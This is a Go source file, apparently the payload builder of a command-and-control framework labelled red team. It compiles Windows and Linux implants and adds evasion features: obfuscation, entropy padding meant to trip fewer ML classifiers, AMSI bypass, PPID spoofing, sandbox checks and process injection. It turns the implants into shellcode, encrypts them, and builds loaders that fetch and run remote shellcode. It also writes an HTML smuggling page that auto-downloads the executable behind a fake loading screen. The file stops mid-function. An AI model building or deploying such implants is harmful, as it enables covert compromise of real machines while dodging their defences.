package server

import (
	"bufio"
	"bytes"
	"compress/zlib"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

type BuildConfig struct {
	ServerURL    string `json:"server_url"`
	Transport    string `json:"transport"`
	SleepSec     int    `json:"sleep_sec"`
	JitterPct    int    `json:"jitter_pct"`
	AgentCertPEM string `json:"agent_cert_pem,omitempty"`
	AgentKeyPEM  string `json:"agent_key_pem,omitempty"`
	CACertPEM    string `json:"ca_cert_pem,omitempty"`
	// Build options
	Lang          string `json:"lang"`           // "go"(default) | "nim"
	Arch          string `json:"arch"`           // "amd64"(default) | "386" | "arm64"
	GOOS          string `json:"goos"`           // "windows"(default) | "linux"
	Garble        bool   `json:"garble"`
	KillDate      string `json:"kill_date"`      // "2026-01-15" or ""
	SandboxChecks bool   `json:"sandbox_checks"`
	InjectMethod    string `json:"inject_method"`    // ""|"fiber"|"callback"|"ntthread"
	SacrificialProc string `json:"sacrificial_proc"` // e.g. C:\Windows\System32\dllhost.exe
	Encrypt       string `json:"encrypt"`        // ""|"xor"|"aes"
	Format        string `json:"format"`         // "exe"|"dll"|"linux"|"html"|"lnk"|"iso"|"hta"
	// Malleable profile
	UserAgent   string `json:"user_agent"`
	BeaconURIs  string `json:"beacon_uris"`
	HttpHeaders string `json:"http_headers"`
	ProxyURL    string `json:"proxy_url"`
	// Operational
	WorkingHours string `json:"working_hours"` // "09:00-17:00"
	SMBPipe      string `json:"smb_pipe"`
	// DNS transport
	DNSServer string `json:"dns_server"`
	DNSDomain string `json:"dns_domain"`
	// Auto-exit after N consecutive failures (0 = disabled)
	MaxRetry     int  `json:"max_retry"`
	StageCleanup bool `json:"stage_cleanup"`
	// Guardrails
	GuardrailIP       string `json:"guardrail_ip"`
	GuardrailUser     string `json:"guardrail_user"`
	GuardrailHostname string `json:"guardrail_hostname"`
	GuardrailDomain   string `json:"guardrail_domain"`
	// Post-ex named pipe
	PostExPipe string `json:"post_ex_pipe"`
	// Per-build obfuscation key (generated server-side, not from client JSON)
	ObfuscationKey string `json:"obfuscation_key,omitempty"`
	// Comma-separated HTTP headers to strip from all requests
	HttpHeadersRemove string `json:"http_headers_remove"`
	// Staged delivery
	StageURL string `json:"stage_url"`
	// Loader-specific: skip TLS cert verification when fetching payload over https
	TLSSkipVerify bool `json:"tls_skip_verify"`
	// Output filename (optional, overrides default name)
	OutputName string `json:"output_name"`
	// Entropy reduction: append low-entropy padding to lower overall file entropy
	EntropyReduce bool `json:"entropy_reduce"`

	// L2-1: Sleep mask mode — "xor" (default), "noaccess", "ekko"
	SleepMaskMode string `json:"sleep_mask_mode"`
	// L2-2: AMSI bypass method — "patch" (default), "veh"
	AMSIMethod string `json:"amsi_method"`
	// L2-3: PPID spoof target process name
	PPIDSpoof string `json:"ppid_spoof"`
	// L2-4: Apply transform obfuscation to embedded payloads
	TransformObfuscate bool `json:"transform_obfuscate"`
	// L2-5: Drip-loading chunk size (bytes) and delay between chunks (ms)
	DripChunkSize int `json:"drip_chunk_size"`
	DripDelayMs   int `json:"drip_delay_ms"`
}

// ── Build functions ───────────────────────────────────────────────────────────

// reduceEntropy appends 1 MB of low-entropy repetitive padding to the file.
// The padding is a PE overlay (ignored by the loader) with a pattern that
// lowers the file's overall Shannon entropy, tripping fewer ML classifiers.
func reduceEntropy(path string) error {
	const padSize = 1 << 20 // 1 MB
	f, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY, 0755)
	if err != nil {
		return err
	}
	defer f.Close()
	// Repeating 16-byte pattern (entropy ≈ 4 bits/byte vs ~7.8 for packed code)
	const pattern = "_XPAD000_DATA00\x00"
	buf := make([]byte, padSize)
	for i := range buf {
		buf[i] = pattern[i%len(pattern)]
	}
	_, err = f.Write(buf)
	return err
}

// resolveOutName returns cfg.OutputName if set, otherwise the defaultName.
// If OutputName has no extension and defaultName does, the defaultName's extension is appended.
func resolveOutName(cfg BuildConfig, defaultName string) string {
	if n := strings.TrimSpace(cfg.OutputName); n != "" {
		if filepath.Ext(n) == "" {
			if ext := filepath.Ext(defaultName); ext != "" {
				return n + ext
			}
		}
		return n
	}
	return defaultName
}

// BuildEXE cross-compiles the agent for Windows.
func BuildEXE(cfg BuildConfig, outDir string) (string, error) {
	gobin, err := findGoOrGarble(cfg.Garble)
	if err != nil {
		return "", err
	}
	root := projectRoot()
	outDir = absDir(root, outDir)
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return "", fmt.Errorf("crear directorio: %w", err)
	}
	arch := normalizeArch(cfg.Arch)
	outPath := filepath.Join(outDir, resolveOutName(cfg, fmt.Sprintf("agent_%s.exe", arch)))
	pkgPath := filepath.Join(root, "agents", "agent-go", "cmd")

	cmd := buildCmd(gobin, cfg.Garble,
		"-trimpath", "-ldflags", buildLDFlags(cfg), "-o", outPath, pkgPath)
	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH="+arch, "CGO_ENABLED=0")
	cmd.Dir = root
	if out, err := cmd.CombinedOutput(); err != nil {
		return "", fmt.Errorf("go build failed: %v\n%s", err, out)
	}
	if cfg.EntropyReduce {
		if err := reduceEntropy(outPath); err != nil {
			return outPath, fmt.Errorf("entropy reduce: %w", err)
		}
	}
	return outPath, nil
}

// BuildEXEStream is like BuildEXE but writes garble's stderr/stdout to progress line-by-line.
// progress may be nil. The caller is responsible for any SSE framing.
func BuildEXEStream(cfg BuildConfig, outDir string, progress io.Writer) (string, error) {
	gobin, err := findGoOrGarble(cfg.Garble)
	if err != nil {
		return "", err
	}
	root := projectRoot()
	outDir = absDir(root, outDir)
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return "", fmt.Errorf("crear directorio: %w", err)
	}
	arch := normalizeArch(cfg.Arch)
	outPath := filepath.Join(outDir, resolveOutName(cfg, fmt.Sprintf("agent_%s.exe", arch)))
	pkgPath := filepath.Join(root, "agents", "agent-go", "cmd")

	cmd := buildCmd(gobin, cfg.Garble,
		"-trimpath", "-ldflags", buildLDFlags(cfg), "-o", outPath, pkgPath)
	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH="+arch, "CGO_ENABLED=0")
	cmd.Dir = root

	if progress == nil {
		if out, err := cmd.CombinedOutput(); err != nil {
			return "", fmt.Errorf("go build failed: %v\n%s", err, out)
		}
	} else {
		pr, pw := io.Pipe()
		cmd.Stdout = pw
		cmd.Stderr = pw
		if err := cmd.Start(); err != nil {
			return "", fmt.Errorf("start build: %w", err)
		}
		errCh := make(chan error, 1)
		go func() { errCh <- cmd.Wait(); pw.Close() }()
		var outBuf strings.Builder
		scanner := bufio.NewScanner(pr)
		for scanner.Scan() {
			line := scanner.Text()
			outBuf.WriteString(line + "\n")
			fmt.Fprintln(progress, line)
		}
		if err := <-errCh; err != nil {
			if s := strings.TrimSpace(outBuf.String()); s != "" {
				return "", fmt.Errorf("go build failed: %v\n%s", err, s)
			}
			return "", fmt.Errorf("go build failed: %w", err)
		}
	}

	if cfg.EntropyReduce {
		if err := reduceEntropy(outPath); err != nil {
			return outPath, fmt.Errorf("entropy reduce: %w", err)
		}
	}
	return outPath, nil
}


// BuildNimEXE cross-compiles the Nim agent for Windows x64.
// Requires nim >= 2.0 (install via choosenim) and x86_64-w64-mingw32-gcc.
func BuildNimEXE(cfg BuildConfig, outDir string) (string, error) {
	root   := projectRoot()
	outDir  = absDir(root, outDir)
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return "", fmt.Errorf("mkdir: %w", err)
	}

	nimDir := filepath.Join(root, "agents", "agent-nim")
	if _, err := os.Stat(filepath.Join(nimDir, "agent.nim")); err != nil {
		return "", fmt.Errorf("agent-nim not found in %s", nimDir)
	}

	nim, err := findNim()
	if err != nil {
		return "", err
	}

	outName  := resolveOutName(cfg, "agent_nim.exe")
	outPath  := filepath.Join(outDir, outName)
	sleepSec := cfg.SleepSec
	if sleepSec <= 0 { sleepSec = 60 }
	jitter   := cfg.JitterPct
	if jitter < 0 { jitter = 20 }

	args := []string{
		"compile",
		"--os:windows", "--cpu:amd64", "--cc:gcc",
		"--gcc.exe:x86_64-w64-mingw32-gcc",
		"--gcc.linkerexe:x86_64-w64-mingw32-gcc",
		"-d:release", "-d:danger", "-d:strip",
		"--app:gui", "--opt:size",
		"--hints:off", "--warnings:off",
		fmt.Sprintf("-d:serverUrl=%s", cfg.ServerURL),
		fmt.Sprintf("-d:sleepSec=%d", sleepSec),
		fmt.Sprintf("-d:jitterPct=%d", jitter),
		fmt.Sprintf("-d:Transport=%s", cfg.Transport),
		fmt.Sprintf("--out:%s", outPath),
	}
	if cfg.UserAgent != "" {
		args = append(args, fmt.Sprintf("-d:UserAgent=%s", cfg.UserAgent))
	}
	if cfg.BeaconURIs != "" {
		args = append(args, fmt.Sprintf("-d:BeaconURIs=%s", cfg.BeaconURIs))
	}
	if cfg.KillDate != "" {
		args = append(args, fmt.Sprintf("-d:KillDate=%s", cfg.KillDate))
	}
	args = append(args, "agent.nim")

	cmd := exec.Command(nim, args...)
	cmd.Dir = nimDir
	// Ensure nimble bin is on PATH for the nim process
	home, _ := os.UserHomeDir()
	nimbleBin := filepath.Join(home, ".nimble", "bin")
	cmd.Env = append(os.Environ(), "PATH="+nimbleBin+":"+os.Getenv("PATH"))

	if out, err := cmd.CombinedOutput(); err != nil {
		return "", fmt.Errorf("nim build failed: %v\n%s", err, out)
	}
	return outPath, nil
}

func findNim() (string, error) {
	home, _ := os.UserHomeDir()
	candidates := []string{
		"nim",
		filepath.Join(home, ".nimble", "bin", "nim"),
		"/usr/bin/nim",
		"/usr/local/bin/nim",
	}
	for _, c := range candidates {
		if path, err := exec.LookPath(c); err == nil {
			return path, nil
		}
		if _, err := os.Stat(c); err == nil {
			return c, nil
		}
	}
	return "", fmt.Errorf("nim not found; install via: curl https://nim-lang.org/choosenim/init.sh -sSf | sh")
}


func copyFile(src, dst string) error {
	data, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	return os.WriteFile(dst, data, 0755)
}

// BuildDLL cross-compiles the agent as a Windows DLL (requires MinGW).
// Garble is intentionally skipped for DLL builds (CGO + garble incompatible).
func BuildDLL(cfg BuildConfig, outDir string) (string, error) {
	arch := normalizeArch(cfg.Arch)
	cc := "x86_64-w64-mingw32-gcc"
	if arch == "386" {
		cc = "i686-w64-mingw32-gcc"
	}
	if _, err := exec.LookPath(cc); err != nil {
		return "", fmt.Errorf("mingw no encontrado (%s): apt install gcc-mingw-w64", cc)
	}
	gobin, err := findGo()
	if err != nil {
		return "", err
	}
	root := projectRoot()
	outDir = absDir(root, outDir)
	os.MkdirAll(outDir, 0755)

	outPath := filepath.Join(outDir, resolveOutName(cfg, fmt.Sprintf("agent_%s.dll", arch)))
	pkgPath := filepath.Join(root, "agents", "agent-go", "dll")

	cmd := exec.Command(gobin, "build",
		"-buildmode=c-shared",
		"-trimpath", "-ldflags", buildLDFlags(cfg),
		"-o", outPath, pkgPath)
	cmd.Env = append(os.Environ(),
		"GOOS=windows", "GOARCH="+arch, "CGO_ENABLED=1", "CC="+cc)
	cmd.Dir = root
	if out, err := cmd.CombinedOutput(); err != nil {
		return "", fmt.Errorf("dll build failed: %v\n%s", err, out)
	}
	return outPath, nil
}

// BuildLinux cross-compiles the agent as a Linux ELF binary.
func BuildLinux(cfg BuildConfig, outDir string) (string, error) {
	gobin, err := findGoOrGarble(cfg.Garble)
	if err != nil {
		return "", err
	}
	arch := normalizeArch(cfg.Arch)
	root := projectRoot()
	outDir = absDir(root, outDir)
	os.MkdirAll(outDir, 0755)

	outPath := filepath.Join(outDir, resolveOutName(cfg, fmt.Sprintf("agent_linux_%s", arch)))
	pkgPath := filepath.Join(root, "agents", "agent-go", "cmd")

	cmd := buildCmd(gobin, cfg.Garble,
		"-trimpath", "-ldflags", buildLDFlags(cfg), "-o", outPath, pkgPath)
	cmd.Env = append(os.Environ(), "GOOS=linux", "GOARCH="+arch, "CGO_ENABLED=0")
	cmd.Dir = root
	if out, err := cmd.CombinedOutput(); err != nil {
		return "", fmt.Errorf("linux build failed: %v\n%s", err, out)
	}
	return outPath, nil
}

// BuildRAW converts a Windows PE to raw shellcode.
// Tries the system donut binary first (handles modern Go binaries/relocations correctly),
// falls back to go-donut if not found.
func BuildRAW(exePath, outDir string) (string, error) {
	root := projectRoot()
	outDir = absDir(root, outDir)
	os.MkdirAll(outDir, 0755)
	base := strings.TrimSuffix(filepath.Base(exePath), filepath.Ext(filepath.Base(exePath)))
	if base == "" {
		base = "agent"
	}
	outPath := filepath.Join(outDir, base+".bin")

	// Prefer system donut (TheWover/donut C binary) — correctly handles base
	// relocations in large modern Go PE files that go-donut misses.
	if donutBin, err := findDonut(); err == nil {
		// -f 1 = raw shellcode, -a 2 = x64, -b 3 = bypass AMSI+WLDP
		cmd := exec.Command(donutBin, "-f", "1", "-a", "2", "-b", "3",
			"-i", exePath, "-o", outPath)
		cmd.Dir = root
		out, err := cmd.CombinedOutput()
		if err != nil {
			return "", fmt.Errorf("donut failed: %v\n%s", err, out)
		}
		// Donut may exit 0 but fail to write the output file (e.g. "File is invalid")
		if _, serr := os.Stat(outPath); serr != nil {
			return "", fmt.Errorf("donut produced no output: %s", strings.TrimSpace(string(out)))
		}
		return outPath, nil
	}

	// Fallback: go-donut (may corrupt embedded strings in Go 1.21+ binaries)
	gobin, err := findGo()
	if err != nil {
		return "", err
	}
	cmd := exec.Command(gobin, "run",
		"github.com/Binject/go-donut@v0.0.0-20220908180326-fcdcc35d591c",
		"-i", exePath, "-o", outPath, "-f", "1", "-a", "x64")
	cmd.Dir = root
	if out, err := cmd.CombinedOutput(); err != nil {
		return "", fmt.Errorf("go-donut failed: %v\n%s", err, out)
	}
	return outPath, nil
}

// findDonut returns the path to the system donut binary if available.
func findDonut() (string, error) {
	// Check common locations: PATH, go/bin, build cache
	candidates := []string{"donut"}
	if home, err := os.UserHomeDir(); err == nil {
		candidates = append(candidates,
			filepath.Join(home, "go", "bin", "donut"),
			filepath.Join(home, ".local", "bin", "donut"),
		)
	}
	for _, c := range candidates {
		if p, err := exec.LookPath(c); err == nil {
			return p, nil
		}
		if _, err := os.Stat(c); err == nil {
			return c, nil
		}
	}
	return "", fmt.Errorf("donut not found")
}

// BuildSRDI converts a Windows DLL to position-independent shellcode using sRDI.
// funcName is the export to call after DllMain (empty = no call).
// userData is optional bytes passed to funcName as argument.
// flags: 0x1=clear PE header, 0x4=obfuscate imports, 0x8=pass shellcode base.
func BuildSRDI(dllPath, funcName string, userData []byte, flags int, outDir string) (string, error) {
	script, err := findSRDIScript()
	if err != nil {
		return "", err
	}
	root := projectRoot()
	outDir = absDir(root, outDir)
	os.MkdirAll(outDir, 0755)

	base := strings.TrimSuffix(filepath.Base(dllPath), filepath.Ext(filepath.Base(dllPath)))
	outPath := filepath.Join(outDir, base+".srdi.bin")

	// Write DLL to a temp copy so ConvertToShellcode.py can write its output
	// next to it (it derives the output path by replacing .dll→.bin)
	tmpDir, err := os.MkdirTemp("", "srdi_")
	if err != nil {
		return "", fmt.Errorf("tempdir: %w", err)
	}
	defer os.RemoveAll(tmpDir)
	tmpDLL := filepath.Join(tmpDir, "payload.dll")
	dllBytes, err := os.ReadFile(dllPath)
	if err != nil {
		return "", fmt.Errorf("read dll: %w", err)
	}
	if err := os.WriteFile(tmpDLL, dllBytes, 0600); err != nil {
		return "", fmt.Errorf("write tmp dll: %w", err)
	}

	args := []string{script, tmpDLL}
	if funcName != "" {
		args = append(args, "-f", funcName)
	}
	if len(userData) > 0 {
		udFile := filepath.Join(tmpDir, "userdata.bin")
		if err := os.WriteFile(udFile, userData, 0600); err == nil {
			args = append(args, "-u", string(userData)) // pass as string arg
		}
	}
	if flags&0x1 != 0 {
		args = append(args, "-c")
	}
	if flags&0x4 != 0 {
		args = append(args, "-i")
	}
	if flags&0x8 != 0 {
		args = append(args, "-b")
	}

	cmd := exec.Command("python3", args...)
	cmd.Dir = filepath.Dir(script) // ConvertToShellcode.py imports ShellcodeRDI from same dir
	if out, err := cmd.CombinedOutput(); err != nil {
		return "", fmt.Errorf("sRDI failed: %v\n%s", err, out)
	}

	// Script writes output as <tmpDLL>.replace('.dll', '.bin') = tmpDir/payload.bin
	tmpBin := strings.TrimSuffix(tmpDLL, ".dll") + ".bin"
	sc, err := os.ReadFile(tmpBin)
	if err != nil {
		return "", fmt.Errorf("sRDI produced no output: %w", err)
	}
	if err := os.WriteFile(outPath, sc, 0600); err != nil {
		return "", fmt.Errorf("write srdi bin: %w", err)
	}
	return outPath, nil
}

// findSRDIScript returns the path to ConvertToShellcode.py from the sRDI repo.
func findSRDIScript() (string, error) {
	root := projectRoot()
	candidates := []string{
		filepath.Join(root, "tools", "sRDI", "Python", "ConvertToShellcode.py"),
		filepath.Join(root, "tools", "sRDI", "ConvertToShellcode.py"),
		"/opt/sRDI/Python/ConvertToShellcode.py",
		"/opt/sRDI/ConvertToShellcode.py",
	}
	if home, err := os.UserHomeDir(); err == nil {
		candidates = append(candidates,
			filepath.Join(home, "tools", "sRDI", "Python", "ConvertToShellcode.py"),
		)
	}
	for _, p := range candidates {
		if _, err := os.Stat(p); err == nil {
			return p, nil
		}
	}
	return "", fmt.Errorf("ConvertToShellcode.py not found; run: git clone https://github.com/monoxgas/sRDI tools/sRDI")
}

// BuildHTML generates an HTML smuggling page that auto-downloads the EXE.
func BuildHTML(exePath, outDir string) (string, error) {
	data, err := os.ReadFile(exePath)
	if err != nil {
		return "", fmt.Errorf("leer exe: %w", err)
	}
	encoded := base64.StdEncoding.EncodeToString(data)
	filename := filepath.Base(exePath)

	html := fmt.Sprintf(`<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Loading...</title></head>
<body>
<p>Loading document, please wait...</p>
<script>
(function(){
var b=atob("%s");
var n=new Uint8Array(b.length);
for(var i=0;i<b.length;i++)n[i]=b.charCodeAt(i);
var blob=new Blob([n],{type:"application/octet-stream"});
var a=document.createElement("a");
a.href=URL.createObjectURL(blob);
a.download="%s";
document.body.appendChild(a);
a.click();
setTimeout(function(){document.body.removeChild(a);URL.revokeObjectURL(a.href);},10000);
})();
</script>
</body>
</html>`, encoded, filename)

	outPath := filepath.Join(outDir, "delivery.html")
	if err := os.WriteFile(outPath, []byte(html), 0644); err != nil {
		return "", err
	}
	return outPath, nil
}

// CompressPayload zlib-compresses data and returns the result.
// The loader decompresses in-memory before execution, reducing download size ~4x.
func CompressPayload(data []byte) ([]byte, error) {
	var buf bytes.Buffer
	w, err := zlib.NewWriterLevel(&buf, zlib.BestCompression)
	if err != nil {
		return nil, err
	}
	if _, err := w.Write(data); err != nil {
		w.Close()
		return nil, err
	}
	if err := w.Close(); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

// BuildLoader compiles the minimal Go loader that downloads XOR-encrypted,
// zlib-compressed shellcode from payloadURL at runtime, decompresses and
// executes it — either injecting into SacrificialProc or falling back to self.
func BuildLoader(cfg BuildConfig, payloadURL, xorKeyHex, outDir string) (string, error) {
	gobin, err := findGoOrGarble(cfg.Garble)
	if err != nil {
		return "", err
	}
	root := projectRoot()
	outDir = absDir(root, outDir)
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return "", fmt.Errorf("mkdir: %w", err)
	}
	arch := normalizeArch(cfg.Arch)
	outPath := filepath.Join(outDir, resolveOutName(cfg, fmt.Sprintf("loader_%s.exe", arch)))
	pkgPath := filepath.Join(root, "loaders", "loader-go")

	ldf := fmt.Sprintf("-s -w -X redteam/loaders/loader-go.PayloadURL=%s -X redteam/loaders/loader-go.XORKey=%s",
		payloadURL, xorKeyHex)
	if cfg.UserAgent != "" {
		ldf += fmt.Sprintf(" -X redteam/loaders/loader-go.UserAgent=%s", cfg.UserAgent)
	}
	if cfg.SacrificialProc != "" {
		ldf += fmt.Sprintf(" \"-X redteam/loaders/loader-go.SacrificialProc=%s\"", cfg.SacrificialProc)
	}
	if cfg.InjectMethod != "" && cfg.InjectMethod != "thread" {
		// reuse InjectMethod as InjectExisting process name when it's a process name (e.g. "explorer.exe")
		ldf += fmt.Sprintf(" -X redteam/loaders/loader-go.InjectExisting=%s", cfg.InjectMethod)
	}
	if cfg.ProxyURL != "" {
		ldf += fmt.Sprintf(" -X redteam/loaders/loader-go.ProxyURL=%s", cfg.ProxyURL)
	}
	if cfg.TLSSkipVerify {
		ldf += " -X redteam/loaders/loader-go.TLSSkipVerify=true"
	}

	cmd := buildCmd(gobin, cfg.Garble, "-trimpath", "-ldflags", ldf, "-o", outPath, pkgPath)
	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH="+arch, "CGO_ENABLED=0")
	cmd.Dir = root
	if out, err := cmd.CombinedOutput(); err != nil {
		return "", fmt.Errorf("build loader: %v\n%s", err, out)
	}
	if cfg.EntropyReduce {
		_ = reduceEntropy(outPath)
	}
	return outPath, nil
}

// BuildCLoader cross-compiles the C WinHTTP shellcode loader for Windows x64.
// It invokes x86_64-w64-mingw32-gcc with -DPayloadURL and -DXORKey so the
// constants are baked in at compile time. The resulting .exe is written to outDir.
func BuildCLoader(cfg BuildConfig, payloadURL, xorKeyHex, outDir string) (string, error) {
	cc := "x86_64-w64-mingw32-gcc"
	if _, err := exec.LookPath(cc); err != nil {
		return "", fmt.Errorf("mingw not found (%s): apt install gcc-mingw-w64-x86-64", cc)
	}

	root := projectRoot()
	outDir = absDir(root, outDir)
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return "", fmt.Errorf("mkdir: %w", err)
	}

	srcPath := filepath.Join(root, "loaders", "loader-c", "loader.c")
	if _, err := os.Stat(srcPath); err != nil {
		return "", fmt.Errorf("loader.c not found at %s", srcPath)
	}

	outPath := filepath.Join(outDir, resolveOutName(cfg, "loader_c_amd64.exe"))

	args := []string{
		"-O2", "-s", "-mwindows",
		"-Wall", "-Wno-unused-parameter",
		fmt.Sprintf("-DPayloadURL=%q", payloadURL),
		fmt.Sprintf("-DXORKey=%q", xorKeyHex),
		"-o", outPath,
		srcPath,
		"-lwinhttp", "-lkernel32",
	}

	cmd := exec.Command(cc, args...)
	cmd.Dir = root
	if out, err := cmd.CombinedOutput(); err != nil {
		return "", fmt.Errorf("c loader build failed: %v\n%s", err, out)
	}
	if cfg.EntropyReduce {
		_ = reduceEntropy(outPath)
	}
	return outPath, nil
}

// BuildNimLoader compiles the Nim WinHTTP shellcode loader for Windows x64.
// payloadURL is the HTTP/HTTPS URL serving the XOR-encrypted shellcode.
// xorKeyHex is the key as a hex string (e.g. "aabbccdd11223344").
// Returns the absolute path to the compiled loader_nim.exe.
func BuildNimLoader(cfg BuildConfig, payloadURL, xorKeyHex, outDir string) (string, error) {
	nim, err := findNim()
	if err != nil {
		return "", err
	}
	root := projectRoot()
	outDir = absDir(root, outDir)
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return "", fmt.Errorf("mkdir: %w", err)
	}

	nimDir := filepath.Join(root, "loaders", "loader-nim")
	if _, err := os.Stat(filepath.Join(nimDir, "loader.nim")); err != nil {
		return "", fmt.Errorf("loader-nim not found in %s", nimDir)
	}

	outName := resolveOutName(cfg, "loader_nim.exe")
	outPath := filepath.Join(outDir, outName)

	args := []string{
		"c",
		"-d:mingw",
		"-d:strip",
		"-d:danger",
		"--opt:size",
		"--app:gui",
		"--hints:off",
		"--warnings:off",
		"--cc:gcc",
		"--gcc.exe:x86_64-w64-mingw32-gcc",
		"--gcc.linkerexe:x86_64-w64-mingw32-gcc",
		fmt.Sprintf("-d:payloadUrl=%s", payloadURL),
		fmt.Sprintf("-d:xorKey=%s", xorKeyHex),
		fmt.Sprintf("--out:%s", outPath),
		"loader.nim",
	}

	cmd := exec.Command(nim, args...)
	cmd.Dir = nimDir

	home, _ := os.UserHomeDir()
	nimbleBin := filepath.Join(home, ".nimble", "bin")
	cmd.Env = append(os.Environ(), "PATH="+nimbleBin+":"+os.Getenv("PATH"))

	if out, err := cmd.CombinedOutput(); err != nil {
		return "", fmt.Errorf("nim loader build failed: %v\n%s", err, out)
	}
	if cfg.EntropyReduce {
		_ = reduceEntropy(outPath)
	}
	return outPath, nil
}

// EncryptPayload encrypts a shellcode .bin with XOR or AES-GCM and writes:
//   - <outDir>/agent_enc_<method>.bin  — encrypted shellcode
//   - <outDir>/stub_<method>.c         — self-contained C loader stub
func EncryptPayload(binPath, method, outDir string) (encPath, stubPath string, err error) {
	data, err := os.ReadFile(binPath)
	if err != nil {
		return "", "", fmt.Errorf("leer bin: %w", err)
	}

	var key, encrypted []byte

	switch method {
	case "poly":
		// Polymorphic SGN-style encoder: self-decoding x64 stub prepended to
		// encoded payload. No separate C stub needed — run the .bin directly.
		out, err := PolyEncode(data)
		if err != nil {
			return "", "", fmt.Errorf("poly encode: %w", err)
		}
		encBase := strings.TrimSuffix(filepath.Base(binPath), filepath.Ext(filepath.Base(binPath)))
		encPath = filepath.Join(outDir, encBase+"_enc_poly.bin")
		if err := os.WriteFile(encPath, out, 0644); err != nil {
			return "", "", fmt.Errorf("poly: write: %w", err)
		}
		return encPath, "", nil // no C stub; stub is embedded in the .bin

	case "xor":
		key = make([]byte, 16)
		if _, err := rand.Read(key); err != nil {
			return "", "", err
		}
		encrypted = make([]byte, len(data))
		for i, b := range data {
			encrypted[i] = b ^ key[i%len(key)]
		}

	case "aes":
		key = make([]byte, 32) // AES-256
		if _, err := rand.Read(key); err != nil {
			return "", "", err
		}
		block, err := aes.NewCipher(key)
		if err != nil {
			return "", "", err
		}
		gcm, err := cipher.NewGCM(block)
		if err != nil {
			return "", "", err
		}
		nonce := make([]byte, gcm.NonceSize()) // 12 bytes
		if _, err := rand.Read(nonce); err != nil {
			return "", "", err
		}
		// Layout: [12 nonce][ciphertext][16 tag]
		encrypted = gcm.Seal(nonce, nonce, data, nil)

	default:
		return "", "", fmt.Errorf("método desconocido: %s (usa xor, aes o poly)", method)
	}

	encBase := strings.TrimSuffix(filepath.Base(binPath), filepath.Ext(filepath.Base(binPath)))
	encPath = filepath.Join(outDir, fmt.Sprintf("%s_enc_%s.bin", encBase, method))
	if err := os.WriteFile(encPath, encrypted, 0644); err != nil {
		return "", "", err
	}

	stubPath = filepath.Join(outDir, fmt.Sprintf("stub_%s_%s.c", encBase, method))
	stub := generateCStub(key, method, filepath.Base(encPath))
	if err := os.WriteFile(stubPath, []byte(stub), 0644); err != nil {
		return encPath, "", err
	}
	return encPath, stubPath, nil
}

// ── helpers ───────────────────────────────────────────────────────────────────

// mtlsToHTTPFallback derives a plain HTTP fallback URL from the mTLS server URL.
// It replaces "https://" with "http://" and port 8443 with 8080.
func mtlsToHTTPFallback(serverURL string) string {
	u := strings.Replace(serverURL, "https://", "http://", 1)
	u = strings.Replace(u, ":8443", ":8080", 1)
	if u == serverURL {
		return ""
	}
	return u
}

func buildLDFlags(cfg BuildConfig) string {
	var flags []string
	flags = append(flags, "-s", "-w")

	// Generate a unique per-build obfuscation key
	keyBytes := make([]byte, 8)
	rand.Read(keyBytes) //nolint:errcheck
	obfKey := hex.EncodeToString(keyBytes)

	add := func(k, v string) {
		entry := fmt.Sprintf("redteam/agents/agent-go.%s=%s", k, v)
		if strings.ContainsAny(v, " \t") {
			entry = `"` + entry + `"`
		}
		flags = append(flags, "-X", entry)
	}
	add("ObfuscationKey", obfKey)
	add("ServerURL", cfg.ServerURL)
	add("Transport", cfg.Transport)
	add("SleepSec", fmt.Sprintf("%d", cfg.SleepSec))
	add("JitterPct", fmt.Sprintf("%d", cfg.JitterPct))

	if cfg.Transport == "mtls" {
		add("AgentCertPEM", base64.StdEncoding.EncodeToString([]byte(cfg.AgentCertPEM)))
		add("AgentKeyPEM", base64.StdEncoding.EncodeToString([]byte(cfg.AgentKeyPEM)))
		add("CACertPEM", base64.StdEncoding.EncodeToString([]byte(cfg.CACertPEM)))
		// Derive HTTP fallback URL from the mTLS URL (replace port 8443 → 8080, https → http)
		if fallback := mtlsToHTTPFallback(cfg.ServerURL); fallback != "" {
			add("HTTPFallbackURL", fallback)
		}
	}
	if cfg.KillDate != "" {
		add("KillDate", cfg.KillDate)
	}
	if cfg.SandboxChecks {
		add("SandboxChecks", "true")
	}
	if cfg.InjectMethod != "" && cfg.InjectMethod != "thread" {
		add("InjectMethod", cfg.InjectMethod)
	}
	if cfg.SacrificialProc != "" {
		add("SacrificialProc", cfg.SacrificialProc)
	}
	if cfg.UserAgent != "" {
		add("UserAgent", cfg.UserAgent)
	}
	if cfg.BeaconURIs != "" {
		add("BeaconURIs", cfg.BeaconURIs)
	}
	if cfg.HttpHeaders != "" {
		add("HttpHeaders", cfg.HttpHeaders)
	}
	if cfg.ProxyURL != "" {
		add("ProxyURL", cfg.ProxyURL)
	}
	if cfg.WorkingHours != "" {
		add("WorkingHours", cfg.WorkingHours)
	}
	if cfg.SMBPipe != "" {
		add("SMBPipe", cfg.SMBPipe)
	}
	if cfg.DNSServer != "" {
		add("DNSServer", cfg.DNSServer)
	}
	if cfg.DNSDomain != "" {
		add("DNSDomain", cfg.DNSDomain)
	}
	if cfg.MaxRetry > 0 {
		add("MaxRetry", fmt.Sprintf("%d", cfg.MaxRetry))
	}
	if cfg.StageCleanup {
		add("StageCleanup", "true")
	}
	if cfg.GuardrailIP != "" {
		add("GuardrailIP", cfg.GuardrailIP)
	}
	if cfg.GuardrailUser != "" {
		add("GuardrailUser", cfg.GuardrailUser)
	}
	if cfg.GuardrailHostname != "" {
		add("GuardrailHostname", cfg.GuardrailHostname)
	}
	if cfg.GuardrailDomain != "" {
		add("GuardrailDomain", cfg.GuardrailDomain)
	}
	if cfg.PostExPipe != "" {
		add("PostExPipe", cfg.PostExPipe)
	}
	if cfg.HttpHeadersRemove != "" {
		add("HttpHeadersRemove", cfg.HttpHeadersRemove)
	}
